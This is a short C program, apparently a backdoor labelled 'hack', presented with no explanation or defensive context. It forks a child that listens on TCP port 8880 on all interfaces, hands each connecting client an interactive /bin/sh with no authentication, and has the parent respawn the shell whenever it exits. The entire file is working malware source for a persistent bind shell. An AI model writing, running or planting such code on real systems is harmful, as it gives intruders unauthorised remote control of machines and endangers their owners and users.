#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv){
	int pid = 0;
	int exit_status = 0;

FORK:
	pid = fork();
	if(pid){ // Parent wait for child terminate
		waitpid(pid, &exit_status, 0);
		printf("hack abnormally exited\n");
		sleep(1);
		printf("hack Restarting...\n");
		goto FORK;
	}else{ // Child
		int scktd = -1;
		int scktd_client = -1;
		int i = -1;
		struct sockaddr_in server;
		struct sockaddr_in client;

		scktd = socket(AF_INET,SOCK_STREAM,0);
		if (scktd == -1)
			return -1;

		server.sin_family = AF_INET;
		server.sin_addr.s_addr = INADDR_ANY;
		server.sin_port = htons(8880);

		if(bind(scktd,(struct sockaddr *)&server,sizeof(server)) < 0)
			return -2;

		listen(scktd,3);
		i = sizeof(struct sockaddr_in);
		scktd_client = accept(scktd,(struct sockaddr *)&client,(socklen_t*)&i);
		if (scktd_client < 0)
			return -3;

		dup2(scktd_client,0); // STDIN
		dup2(scktd_client,1); // STDOUT
		dup2(scktd_client,2); // STDERR

		execl("/bin/sh","sh","-i",NULL,NULL);
	}

	return 0;
}